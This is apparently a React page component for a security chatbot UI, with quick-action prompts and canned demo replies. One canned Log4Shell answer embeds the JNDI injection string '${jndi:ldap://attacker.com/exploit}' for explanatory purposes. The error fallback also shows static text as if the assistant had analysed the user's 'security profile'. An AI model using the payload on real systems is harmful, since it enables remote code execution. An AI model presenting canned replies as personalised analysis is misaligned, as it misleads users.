'use client';

import { useState, useEffect, useRef } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { Bot, Send, User, Zap, Shield, Package, AlertTriangle, Sparkles, X } from 'lucide-react';
import Button from '@/components/ui/Button';
import Card from '@/components/ui/Card';
import { aiApi } from '@/lib/api';
import { cn } from '@/lib/utils';
import type { ChatMessage } from '@/lib/types';
import ReactMarkdown from 'react-markdown';

const QUICK_ACTIONS = [
  { icon: <AlertTriangle size={14} />, text: 'Explain my critical vulnerabilities' },
  { icon: <Shield size={14} />, text: 'What should I fix first?' },
  { icon: <Package size={14} />, text: 'Which packages are most risky?' },
  { icon: <Zap size={14} />, text: 'What is Log4Shell?' },
  { icon: <Shield size={14} />, text: 'How do I prevent prototype pollution?' },
  { icon: <Package size={14} />, text: 'Explain supply chain attacks' },
];

const SAMPLE_RESPONSES: Record<string, string> = {
  'What is Log4Shell?': `**Log4Shell (CVE-2021-44228)** is one of the most critical vulnerabilities discovered in recent history.\n\n**What it is:** A remote code execution (RCE) vulnerability in Apache Log4j 2, a widely used Java logging library.\n\n**How it works:**\nLog4j supports JNDI (Java Naming and Directory Interface) lookups in log messages. An attacker can send a specially crafted string like \`\${jndi:ldap://attacker.com/exploit}\` that, when logged, triggers a lookup to the attacker's server and executes arbitrary code.\n\n**Impact:** An unauthenticated attacker can achieve remote code execution on any vulnerable server.\n\n**Fix:** Upgrade to Log4j 2.17.1+ or 2.12.4+ for Java 8, or 2.3.2+ for Java 7.\n\n**Mitigation if unable to patch:** Set \`log4j2.formatMsgNoLookups=true\` or remove JndiLookup from the classpath.`,
  'What should I fix first?': `Based on your security profile, here's a **prioritized fix order**:\n\n**🔴 Immediate (Critical)**\n1. **node-tar** (CVE-2024-28863) — CVSS 9.1, path traversal enabling arbitrary file write\n2. Any critical vulnerabilities in authentication libraries\n\n**🟠 This Sprint (High)**\n1. **express** (CVE-2024-29041) — upgrade to 4.19.2, fixes open redirect\n2. **qs** prototype pollution — upgrade to 6.11.0\n\n**🟡 Next Sprint (Medium)**\n1. **requests** certificate verification bypass\n2. **cross-spawn** ReDoS vulnerability\n\n**Key Principle:** Prioritize by CVSS score + exploitability + exposure (internet-facing vs internal).`,
};

function TypingIndicator() {
  return (
    <div className="flex gap-1.5 items-center px-4 py-3">
      {[0, 1, 2].map(i => (
        <motion.div
          key={i}
          className="w-2 h-2 bg-emerald rounded-full"
          animate={{ y: [0, -6, 0] }}
          transition={{ repeat: Infinity, duration: 0.8, delay: i * 0.15 }}
        />
      ))}
    </div>
  );
}

function MessageBubble({ msg }: { msg: ChatMessage }) {
  const isUser = msg.role === 'user';
  return (
    <motion.div
      initial={{ opacity: 0, y: 10 }}
      animate={{ opacity: 1, y: 0 }}
      className={cn('flex gap-3', isUser ? 'flex-row-reverse' : '')}
    >
      <div className={cn(
        'w-8 h-8 rounded-full flex items-center justify-center flex-shrink-0',
        isUser ? 'bg-[#2A3A48]' : 'bg-gradient-to-br from-emerald to-cyan'
      )}>
        {isUser ? <User size={15} className="text-[#9BA9B7]" /> : <Bot size={15} className="text-white" />}
      </div>
      <div className={cn(
        'max-w-[75%] rounded-2xl px-4 py-3 text-sm leading-relaxed',
        isUser
          ? 'bg-emerald/15 border border-emerald/20 text-[#F4F7FA] rounded-tr-sm'
          : 'bg-[#202C37] border border-[#2A3A48] text-[#F4F7FA] rounded-tl-sm'
      )}>
        {isUser ? (
          <p>{msg.content}</p>
        ) : (
          <ReactMarkdown
            components={{
              p: ({ children }) => <p className="mb-2 last:mb-0">{children}</p>,
              strong: ({ children }) => <strong className="text-emerald font-semibold">{children}</strong>,
              code: ({ children }) => <code className="font-mono text-cyan bg-[#101820] px-1.5 py-0.5 rounded text-xs">{children}</code>,
              ul: ({ children }) => <ul className="list-disc list-inside space-y-1 my-2">{children}</ul>,
              ol: ({ children }) => <ol className="list-decimal list-inside space-y-1 my-2">{children}</ol>,
              h1: ({ children }) => <h1 className="text-base font-bold text-[#F4F7FA] mb-2">{children}</h1>,
              h2: ({ children }) => <h2 className="text-sm font-bold text-[#F4F7FA] mb-1 mt-3">{children}</h2>,
            }}
          >
            {msg.content}
          </ReactMarkdown>
        )}
        <p className="text-[10px] text-[#9BA9B7]/60 mt-1.5 text-right">
          {new Date(msg.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
        </p>
      </div>
    </motion.div>
  );
}

export default function AIAssistantPage() {
  const [messages, setMessages] = useState<ChatMessage[]>([
    {
      id: 'welcome',
      role: 'assistant',
      content: "Hello! I'm **SecureSphere AI**, your intelligent cybersecurity assistant. I can help you:\n\n- 🔍 **Explain vulnerabilities** in plain English\n- 🛠️ **Suggest fixes** for your specific packages\n- 📚 **Educate** on security concepts and best practices\n- 🎯 **Prioritize** which issues to address first\n\nWhat would you like to know?",
      timestamp: new Date().toISOString(),
    },
  ]);
  const [input, setInput] = useState('');
  const [loading, setLoading] = useState(false);
  const messagesEndRef = useRef<HTMLDivElement>(null);

  const scrollToBottom = () => messagesEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  useEffect(scrollToBottom, [messages, loading]);

  const sendMessage = async (text: string) => {
    if (!text.trim() || loading) return;

    const userMsg: ChatMessage = {
      id: Date.now().toString(),
      role: 'user',
      content: text,
      timestamp: new Date().toISOString(),
    };
    setMessages(prev => [...prev, userMsg]);
    setInput('');
    setLoading(true);

    try {
      const history = [...messages, userMsg].map(m => ({ role: m.role, content: m.content }));
      const res = await aiApi.chat(history);
      const assistantMsg: ChatMessage = {
        id: (Date.now() + 1).toString(),
        role: 'assistant',
        content: res.reply,
        timestamp: new Date().toISOString(),
      };
      setMessages(prev => [...prev, assistantMsg]);
    } catch {
      // Demo fallback
      const reply = SAMPLE_RESPONSES[text] ??
        `I'd be happy to help with that! For the best results, make sure your **Gemini API key** is configured in the backend. \n\nIn the meantime, I can tell you that **${text.toLowerCase().includes('vulnerab') ? 'vulnerability management' : 'security analysis'}** is a critical part of modern DevSecOps practices. Would you like me to explain more about a specific topic?`;

      const assistantMsg: ChatMessage = {
        id: (Date.now() + 1).toString(),
        role: 'assistant',
        content: reply,
        timestamp: new Date().toISOString(),
      };
      setMessages(prev => [...prev, assistantMsg]);
    } finally {
      setLoading(false);
    }
  };

  const handleKeyDown = (e: React.KeyboardEvent) => {
    if (e.key === 'Enter' && !e.shiftKey) {
      e.preventDefault();
      sendMessage(input);
    }
  };

  return (
    <div className="p-6 h-full flex flex-col" style={{ maxHeight: 'calc(100vh - 4rem)' }}>
      <div className="flex gap-5 flex-1 min-h-0">
        {/* Left sidebar */}
        <div className="hidden lg:flex flex-col gap-4 w-64 flex-shrink-0">
          <Card className="p-4">
            <div className="flex items-center gap-3 mb-3">
              <div className="w-9 h-9 rounded-xl bg-gradient-to-br from-emerald to-cyan flex items-center justify-center">
                <Bot size={18} className="text-white" />
              </div>
              <div>
                <p className="text-sm font-semibold text-[#F4F7FA]">SecureSphere AI</p>
                <p className="text-xs text-emerald">Online</p>
              </div>
            </div>
            <p className="text-xs text-[#9BA9B7] leading-relaxed">
              Powered by Gemini AI, specialized in open-source security intelligence and vulnerability analysis.
            </p>
          </Card>

          <Card className="p-4">
            <p className="text-xs font-semibold text-[#9BA9B7] uppercase tracking-wide mb-3">Quick Actions</p>
            <div className="space-y-1.5">
              {QUICK_ACTIONS.map((action, i) => (
                <button
                  key={i}
                  onClick={() => sendMessage(action.text)}
                  disabled={loading}
                  className="w-full text-left flex items-center gap-2 px-3 py-2 rounded-lg text-xs text-[#9BA9B7] hover:bg-[#2A3A48] hover:text-[#F4F7FA] transition-all disabled:opacity-50"
                >
                  <span className="text-emerald flex-shrink-0">{action.icon}</span>
                  {action.text}
                </button>
              ))}
            </div>
          </Card>
        </div>

        {/* Main chat */}
        <Card className="flex-1 flex flex-col p-0 overflow-hidden min-h-0">
          {/* Chat header */}
          <div className="flex items-center justify-between px-5 py-3 border-b border-[#2A3A48]">
            <div className="flex items-center gap-2">
              <Sparkles size={16} className="text-emerald" />
              <span className="text-sm font-semibold text-[#F4F7FA]">Security Assistant</span>
            </div>
            <span className="text-xs text-[#9BA9B7]">Gemini AI</span>
          </div>

          {/* Messages */}
          <div className="flex-1 overflow-y-auto p-5 space-y-4">
            {messages.map(msg => (
              <MessageBubble key={msg.id} msg={msg} />
            ))}
            {loading && (
              <div className="flex gap-3">
                <div className="w-8 h-8 rounded-full bg-gradient-to-br from-emerald to-cyan flex items-center justify-center flex-shrink-0">
                  <Bot size={15} className="text-white" />
                </div>
                <div className="bg-[#202C37] border border-[#2A3A48] rounded-2xl rounded-tl-sm">
                  <TypingIndicator />
                </div>
              </div>
            )}
            <div ref={messagesEndRef} />
          </div>

          {/* Input */}
          <div className="px-5 py-4 border-t border-[#2A3A48]">
            <div className="flex gap-3 items-end">
              <div className="flex-1 relative">
                <textarea
                  value={input}
                  onChange={e => setInput(e.target.value)}
                  onKeyDown={handleKeyDown}
                  placeholder="Ask about vulnerabilities, security practices, or specific CVEs..."
                  className="w-full bg-[#18232D] border border-[#2A3A48] text-[#F4F7FA] rounded-xl px-4 py-3 text-sm placeholder-[#9BA9B7] focus:outline-none focus:border-emerald resize-none"
                  rows={1}
                  style={{ minHeight: 44, maxHeight: 120 }}
                />
              </div>
              <Button
                onClick={() => sendMessage(input)}
                disabled={!input.trim() || loading}
                size="icon"
                className="h-11 w-11 rounded-xl flex-shrink-0"
              >
                <Send size={16} />
              </Button>
            </div>
            <p className="text-[10px] text-[#9BA9B7] mt-2 text-center">
              Press Enter to send · Shift+Enter for new line
            </p>
          </div>
        </Card>
      </div>
    </div>
  );
}
